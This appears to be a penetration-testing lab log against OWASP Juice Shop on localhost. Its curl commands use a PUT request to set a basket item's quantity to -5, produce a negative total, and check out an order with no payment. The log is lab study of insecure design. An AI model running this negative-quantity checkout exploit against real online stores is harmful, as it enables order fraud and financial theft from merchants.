# Commands Log — OWASP A04: Insecure Design (Juice Shop)

## Setup
cd ~/Alrazzaq_Labs/OWASP-Top-10
mkdir -p 04-Insecure-Design/raw-output 04-Insecure-Design/screenshots
cd 04-Insecure-Design
touch README.md commands.md findings.md methodology.md remediation.md

## Recon: confirm token + basket id from JWT payload
echo "TOKEN: $TOKEN"
# (decoded JWT payload showed id:26, bid:7 — no need to re-login)

## Attempt 1: negative quantity on basket item CREATE (POST)
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":7,"quantity":-5}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/negative_quantity_attempt.json
# Result: 500 — unhandled Sequelize/SQLite exception, stack trace leaked to client

## Boundary testing on CREATE path
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":7,"quantity":0}' \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 500, same stack trace

curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":7,"quantity":-1}' \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 500, same stack trace

## Confirm existing basket state (found pre-existing item id 9, qty 1, ProductId 1)
curl -s "http://localhost:3000/rest/basket/7" \
  -H "Authorization: Bearer $TOKEN" \
  -o raw-output/basket_current_state.json
cat raw-output/basket_current_state.json | python3 -m json.tool

## Confirm CREATE works for a product with no existing row (isolates 500 as unique-constraint collision, not a real block)
curl -s -X POST http://localhost:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":2,"BasketId":7,"quantity":2}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/basket_add_positive_product2.json
cat raw-output/basket_add_positive_product2.json | python3 -m json.tool
# Result: 200 — confirms 500s above were a duplicate-row collision, not a validation control

## Finding: negative quantity via UPDATE (PUT) — no validation on this path
curl -s -X PUT http://localhost:3000/api/BasketItems/9 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":7,"quantity":-5}' \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/basket_update_negative.json
cat raw-output/basket_update_negative.json | python3 -m json.tool
# Result: 200 — quantity: -5 accepted and persisted

## Confirm negative quantity flows into basket total
curl -s "http://localhost:3000/rest/basket/7" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
total = 0
for p in data['Products']:
    qty = p['BasketItem']['quantity']
    price = p['price']
    line = qty * price
    total += line
    print(f\"{p['name']}: qty={qty} x price={price} = {line:.2f}\")
print(f'TOTAL: {total:.2f}')
"
# Result: Apple Juice qty=-5 x 1.99 = -9.95; Orange Juice qty=2 x 2.99 = 5.98; TOTAL: -3.97

## Finding: checkout accepts negative-total basket with zero friction
curl -s -X POST "http://localhost:3000/rest/basket/7/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}\n" \
  -o raw-output/checkout_negative_attempt.json
cat raw-output/checkout_negative_attempt.json | python3 -m json.tool
# Result: 200 — orderConfirmation: 4b0f-bcae0efeb01e4d80 — no address, payment, or delivery step required

## Confirm negative total persisted on the order record itself
curl -s "http://localhost:3000/rest/track-order/4b0f-bcae0efeb01e4d80" \
  -H "Authorization: Bearer $TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}\n"
# Result: 200 — totalPrice: -3.969999999999999, paymentId: null, addressId: null
